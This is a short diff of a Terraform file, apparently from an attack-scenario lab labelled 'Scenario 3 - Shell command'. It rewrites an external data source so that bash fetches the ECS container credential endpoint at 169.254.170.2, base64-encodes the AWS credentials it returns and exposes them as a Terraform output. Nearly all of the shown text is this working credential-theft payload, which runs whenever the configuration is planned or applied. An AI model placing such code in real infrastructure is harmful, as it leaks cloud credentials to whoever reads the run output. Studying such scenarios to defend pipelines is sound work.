@@ -397,11 +397,11 @@ data "aws_iam_policy_document" "access_logs" {
 
 # Scenario 3 - Shell command
 
-data "external" "curl_command" {
-  program = ["/bin/bash", "-c", "curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI |tr -d '\n'"]
+data "external" "shell_command" {
+  program = ["/bin/bash", "-c", "echo \"{\\\"result\\\":\\\"$(curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64)\\\"}\"|tr -d '\n'"]
 }
 
-output "curl_command" {
-  value = data.external.curl_command.result
+output "shell_command" {
+  value = data.external.shell_command.result
 }
 
